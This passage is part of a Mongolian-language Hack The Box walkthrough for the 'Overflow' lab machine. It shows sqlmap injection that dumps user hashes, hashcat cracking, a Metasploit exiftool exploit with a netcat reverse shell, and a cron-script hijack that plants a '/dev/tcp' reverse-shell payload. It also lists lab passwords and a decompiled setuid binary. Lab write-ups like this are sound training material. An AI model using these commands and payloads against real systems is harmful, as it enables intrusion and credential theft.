</span></span></code></pre></div><p><code>2.2.8</code> дээр ажиллах нь <code>python2</code> дээр бичигдсэн. <code>Pyenv</code> суулгаад бас болохгүй байна&mldr;</p><h3 id=6-sqlmap>6. SQLMap<a hidden class=anchor aria-hidden=true href=#6-sqlmap>#</a></h3><figure><img loading=lazy src=/images/overflow_post_image_1.png></figure><p><a href=http://overflow.htb/config/admin_last_login.js>http://overflow.htb/config/admin_last_login.js</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getUsers</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://overflow.htb/home/logs.php?name=admin&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>res</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#a6e22e>url</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>text</span>();
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>error</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>error</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>renderUsers</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>users</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>getUsers</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>html</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>container</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#39;.content&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>container</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>users</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>renderUsers</span>();
</span></span></code></pre></div><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u http://overflow.htb/home/logs.php?name<span style=color:#f92672>=</span> --cookie auth<span style=color:#f92672>=</span>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
</span></span></code></pre></div><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u http://overflow.htb/home/logs.php?name<span style=color:#f92672>=</span> --cookie auth<span style=color:#f92672>=</span>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA --dbs
</span></span></code></pre></div><p>out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>12:41:05<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> the back-end DBMS is MySQL
</span></span><span style=display:flex><span>web server operating system: Linux Ubuntu 18.04 <span style=color:#f92672>(</span>bionic<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>web application technology: Apache 2.4.29
</span></span><span style=display:flex><span>back-end DBMS: MySQL &gt;<span style=color:#f92672>=</span> 5.0.12
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>12:41:05<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching database names
</span></span><span style=display:flex><span>available databases <span style=color:#f92672>[</span>4<span style=color:#f92672>]</span>:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> cmsmsdb
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> information_schema
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> logs
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Overflow
</span></span></code></pre></div><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u http://overflow.htb/home/logs.php?name<span style=color:#f92672>=</span> --cookie auth<span style=color:#f92672>=</span>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA cmsmsdb --tables
</span></span></code></pre></div><p>out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>| cms_module_templates                  |
</span></span><span style=display:flex><span>| cms_modules                           |
</span></span><span style=display:flex><span>| cms_permissions                       |
</span></span><span style=display:flex><span>| cms_permissions_seq                   |
</span></span><span style=display:flex><span>| cms_routes                            |
</span></span><span style=display:flex><span>| cms_siteprefs                         |
</span></span><span style=display:flex><span>| cms_user_groups                       |
</span></span><span style=display:flex><span>| cms_userplugins                       |
</span></span><span style=display:flex><span>| cms_userplugins_seq                   |
</span></span><span style=display:flex><span>| cms_userprefs                         |
</span></span><span style=display:flex><span>| cms_users                             |
</span></span><span style=display:flex><span>| cms_users_seq                         |
</span></span><span style=display:flex><span>| cms_version                           |
</span></span><span style=display:flex><span>+---------------------------------------+
</span></span></code></pre></div><p><code>cms_users</code></p><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u http://overflow.htb/home/logs.php?name<span style=color:#f92672>=</span> --cookie auth<span style=color:#f92672>=</span>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_users --dump
</span></span></code></pre></div><p>out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Database: cmsmsdb
</span></span><span style=display:flex><span>Table: cms_users
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> entries<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
</span></span><span style=display:flex><span>| user_id | email              | active | password                         | username | last_name | first_name | create_date         | admin_access | modified_date       |
</span></span><span style=display:flex><span>+---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>1</span>       | admin@overflow.htb | <span style=color:#ae81ff>1</span>      | c6c6b9310e0e6f3eb3ffeb2baff12fdd | admin    | &lt;blank&gt;   | &lt;blank&gt;    | 2021-05-24 21:18:35 | <span style=color:#ae81ff>1</span>            | 2021-05-26 14:49:15 |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>3</span>       | &lt;blank&gt;            | <span style=color:#ae81ff>1</span>      | e3d748d58b58657bfa4dffe2def0b1c7 | editor   | &lt;blank&gt;   | editor     | 2021-05-25 06:38:33 | <span style=color:#ae81ff>1</span>            | 2021-05-26 04:13:58 |
</span></span><span style=display:flex><span>+---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
</span></span></code></pre></div><p><code>admin@overflow.htb</code>:<code>c6c6b9310e0e6f3eb3ffeb2baff12fdd</code>:<code>admin</code>
<code>&lt;blank></code>:<code>e3d748d58b58657bfa4dffe2def0b1c7</code>:<code>editor</code></p><p>salt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#39;http://overflow.htb/home/logs.php?name=&#39;</span> --cookie auth<span style=color:#f92672>=</span>BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA -D cmsmsdb -T cms_siteprefs --dump
</span></span></code></pre></div><p><code>| sitemask | 6c2d17f37e226486</code></p><p>hash:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486
</span></span></code></pre></div><h4 id=61-hashcat>6.1 Hashcat<a hidden class=anchor aria-hidden=true href=#61-hashcat>#</a></h4><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hashcat -m <span style=color:#ae81ff>20</span> hash /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span><span style=color:#75715e>### Result</span>
</span></span><span style=display:flex><span>e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo
</span></span></code></pre></div><p><code>editor</code>:<code>alpha!@#$%bravo</code><figure><img loading=lazy src=/images/overflow_post_image_2.png></figure></p><p><code>devbuild-job.overflow.htb</code><figure><img loading=lazy src=/images/overflow_post_image_3.png></figure></p><p><code>etc/host</code> дотор нэмэх -> <code>devbuild-job.overflow.htb</code></p><p>Upload хийх боломжтой хэсэг:<figure><img loading=lazy src=/images/overflow_post_image_4.png></figure></p><h4 id=62-msfconsole-with-exiftool>6.2 Msfconsole with exiftool<a hidden class=anchor aria-hidden=true href=#62-msfconsole-with-exiftool>#</a></h4><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 &gt; use <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/fileformat/exiftool_djvu_ant_perl_injection<span style=color:#f92672>)</span> &gt; options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/unix/fileformat/exiftool_djvu_ant_perl_injection<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name      Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----      ---------------  --------  -----------
</span></span><span style=display:flex><span>   FILENAME  msf.jpg          yes       Output file
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>cmd/unix/reverse_netcat<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name   Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----   ---------------  --------  -----------
</span></span><span style=display:flex><span>   LHOST  192.168.1.37     yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   LPORT  <span style=color:#ae81ff>4444</span>             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   **DisablePayloadHandler: True   <span style=color:#f92672>(</span>no handler will be created!<span style=color:#f92672>)</span>**
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   JPEG file
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/fileformat/exiftool_djvu_ant_perl_injection<span style=color:#f92672>)</span> &gt; set LHOST 10.10.14.36
</span></span><span style=display:flex><span>LHOST <span style=color:#f92672>=</span>&gt; 10.10.14.36
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/fileformat/exiftool_djvu_ant_perl_injection<span style=color:#f92672>)</span> &gt; set LPORT <span style=color:#ae81ff>9001</span>
</span></span><span style=display:flex><span>LPORT <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>9001</span>
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>unix/fileformat/exiftool_djvu_ant_perl_injection<span style=color:#f92672>)</span> &gt;
</span></span></code></pre></div><h4 id=63-nc-with-shell-balance>6.3 nc with shell balance<a hidden class=anchor aria-hidden=true href=#63-nc-with-shell-balance>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span>
</span></span><span style=display:flex><span><span style=color:#75715e>###</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>9001</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.36<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.11.119<span style=color:#f92672>]</span> <span style=color:#ae81ff>56042</span>
</span></span><span style=display:flex><span>ls
</span></span><span style=display:flex><span>index.php
</span></span><span style=display:flex><span>resume_upload.php
</span></span><span style=display:flex><span>script.js
</span></span><span style=display:flex><span>style.css
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>shell balance:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p>ctrl+z</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>stty raw -echo
</span></span></code></pre></div><p><code>f+g [enter enter]</code>
буцаад nc орлоо</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
</span></span></code></pre></div><h3 id=7-exploitation>7. Exploitation<a hidden class=anchor aria-hidden=true href=#7-exploitation>#</a></h3><p>cli: /linpeas/</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -m http.server
</span></span><span style=display:flex><span><span style=color:#75715e>## Machine</span>
</span></span><span style=display:flex><span>curl 10.10.14.108:8000/linpeas.sh -o linpeas.sh
</span></span></code></pre></div><p>out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╔══════════╣ Searching passwords in config PHP files                                                                                                               
</span></span><span style=display:flex><span>$config<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;db_password&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;sh@tim@n&#39;</span>;                                                                                                                               
</span></span><span style=display:flex><span>    $this-&gt;_types<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;db_password&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> self::TYPE_STRING;                                                                                                              
</span></span><span style=display:flex><span><span style=color:#75715e>#define(&#39;DB_Password&#39;,&#39;root&#39;);                                                                                                                                     </span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define(&#39;DB_Username&#39;, &#39;root&#39;);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╔══════════╣ Unexpected in /opt <span style=color:#f92672>(</span>usually empty<span style=color:#f92672>)</span>                                                                                                                    
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>16</span>                                                                                                                                                           
</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>3</span> root   root   <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>17</span> 21:56 .                                                                                                                   
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>25</span> root   root   <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>26</span> 21:08 ..                                                                                                                  
</span></span><span style=display:flex><span>-rwxr-x---+  <span style=color:#ae81ff>1</span> tester tester  <span style=color:#ae81ff>109</span> May <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2021</span> commontask.sh                                                                                                       
</span></span><span style=display:flex><span>drwxr-x---+  <span style=color:#ae81ff>2</span> root   root   <span style=color:#ae81ff>4096</span> Sep <span style=color:#ae81ff>17</span> 21:56 file_encrypt
</span></span></code></pre></div><p><code>developer</code>:<code>sh@tim@n</code></p><p>ssh:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh developer@overflow.htb
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>developer<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>developer<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>developer<span style=color:#f92672>)</span>,1002<span style=color:#f92672>(</span>network<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>user.txt
</span></span><span style=display:flex><span>$ cat user.txt
</span></span><span style=display:flex><span>cat: user.txt: Permission denied
</span></span></code></pre></div><p>commontask.sh</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>commontask.sh  file_encrypt
</span></span><span style=display:flex><span>$ cat commontask.sh
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#make sure its running every minute.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bash &lt; &lt;<span style=color:#f92672>(</span>curl -s http://taskmanage.overflow.htb/task.sh<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>commontask -тай адил script үүсгэх</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;10.10.14.41 taskmanage.overflow.htb&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>machine дах etc/hosts дотор өөрийн vm IP-г өгнө. taskmanage - subdomain байхгүй болохоор</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># The following lines are desirable for IPv6 capable hosts</span>
</span></span><span style=display:flex><span>::1     localhost ip6-localhost ip6-loopback
</span></span><span style=display:flex><span>ff02::1 ip6-allnodes
</span></span><span style=display:flex><span>ff02::2 ip6-allrouters
</span></span><span style=display:flex><span>$ echo <span style=color:#e6db74>&#34;10.10.14.108 taskmanage.overflow.htb&#34;</span> &gt;&gt; /etc/hosts
</span></span><span style=display:flex><span>$ cat /etc/hosts
</span></span><span style=display:flex><span>127.0.0.1       localhost
</span></span><span style=display:flex><span>127.0.1.1       overflow        overflow.htb
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># The following lines are desirable for IPv6 capable hosts</span>
</span></span><span style=display:flex><span>::1     localhost ip6-localhost ip6-loopback
</span></span><span style=display:flex><span>ff02::1 ip6-allnodes
</span></span><span style=display:flex><span>ff02::2 ip6-allrouters
</span></span><span style=display:flex><span>10.10.14.36 taskmanage.overflow.htb
</span></span></code></pre></div><p>VM -с</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.41/9001 0&gt;&amp;1&#34;</span> &gt; task.sh
</span></span><span style=display:flex><span>sudo python3 -m http.server <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><p>үүсгээд тэгээд хүлээнэ.</p><p>user.txt</p><pre tabindex=0><code>647b4a**********
</code></pre><h3 id=8-enumeration>8. Enumeration<a hidden class=anchor aria-hidden=true href=#8-enumeration>#</a></h3><h4 id=81-ssh>8.1 ssh<a hidden class=anchor aria-hidden=true href=#81-ssh>#</a></h4><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh-keygen
</span></span><span style=display:flex><span>cd .ssh
</span></span><span style=display:flex><span>cp id_rsa.pub authorized_keys
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> ./authorized_keys
</span></span></code></pre></div><p>id_rsa</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-----BEGIN RSA PRIVATE KEY-----
</span></span><span style=display:flex><span>MIIEogIBAAKC**********
</span></span><span style=display:flex><span>-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span><span style=display:flex><span>ssh tester@overflow.htb -i id_rsa
</span></span></code></pre></div><p>file_encrypt:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tester@overflow:/opt$ cd file_encrypt
</span></span><span style=display:flex><span>total 16K
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root 12K May <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2021</span> file_encrypt
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>399</span> May <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>2021</span> README.md
</span></span></code></pre></div><p>linpeas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -m http.server
</span></span><span style=display:flex><span><span style=color:#75715e>## Machine</span>
</span></span><span style=display:flex><span>curl 10.10.14.108:8000/linpeas.sh -o linpeas.sh
</span></span><span style=display:flex><span>chmod +x linpeas.sh
</span></span></code></pre></div><p>linpeas хэрэгтэй зүйл байгаагүй.</p><p>README.md</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tester@overflow:/opt$ cat file_encrypt/README.md
</span></span><span style=display:flex><span>Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt <span style=color:#66d9ef>function</span> is there but you can<span style=color:#960050;background-color:#1e0010>&#39;</span>t use it now.The PIN should be in your inbox
</span></span></code></pre></div><h4 id=82-file_encrypt>8.2 file_encrypt<a hidden class=anchor aria-hidden=true href=#82-file_encrypt>#</a></h4><p>./file_encrypt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tester@overflow:/opt/file_encrypt$ ./file_encrypt 
</span></span><span style=display:flex><span>This is the code 1804289383. Enter the Pin: <span style=color:#ae81ff>555</span>
</span></span><span style=display:flex><span>Wrong Pin
</span></span></code></pre></div><p>VM руу file_encrypt хуулах:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp -i ../ssh_keys/tester tester@overflow:/opt/file_encrypt/file_encrypt ./file_encrypt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp -i id_rsa tester@overflow.htb:/opt/file_encrypt/file_encrypt ./file_encrypt
</span></span></code></pre></div><p><code>sha256sum</code>-р алдаагүй хуулсан эсэх шалган үзэх.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine VM:</span>
</span></span><span style=display:flex><span>33246b48006e9967c59e332390ae698f99ad75bc05d80e6c8e61c66cd634eff9  file_encrypt
</span></span><span style=display:flex><span><span style=color:#75715e># Local VM</span>
</span></span><span style=display:flex><span>33246b48006e9967c59e332390ae698f99ad75bc05d80e6c8e61c66cd634eff9  file_encrypt
</span></span></code></pre></div><h4 id=83-ghidra>8.3 Ghidra<a hidden class=anchor aria-hidden=true href=#83-ghidra>#</a></h4><p><code>check_pin</code> - filter -с хайж үзэх:<figure><img loading=lazy src=/images/overflow_post_image_5.png></figure></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>check_pin</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  undefined local_2c [<span style=color:#ae81ff>20</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> local_18;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> local_14;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> local_10;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  local_10 <span style=color:#f92672>=</span> <span style=color:#a6e22e>rand</span>();
</span></span><span style=display:flex><span>  local_14 <span style=color:#f92672>=</span> <span style=color:#a6e22e>random</span>();
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;This is the code %i. Enter the Pin: &#34;</span>,local_10);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#f92672>&amp;</span>DAT_00010d1d,<span style=color:#f92672>&amp;</span>local_18);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (local_14 <span style=color:#f92672>==</span> local_18) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;name: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#f92672>&amp;</span>DAT_00010c63,local_2c);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;Thanks for checking. You can give your feedback for improvements at developer@overflow.htb&#34;</span>
</span></span><span style=display:flex><span>        );
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Wrong Pin&#34;</span>);
</span></span><span style=display:flex><span>  }
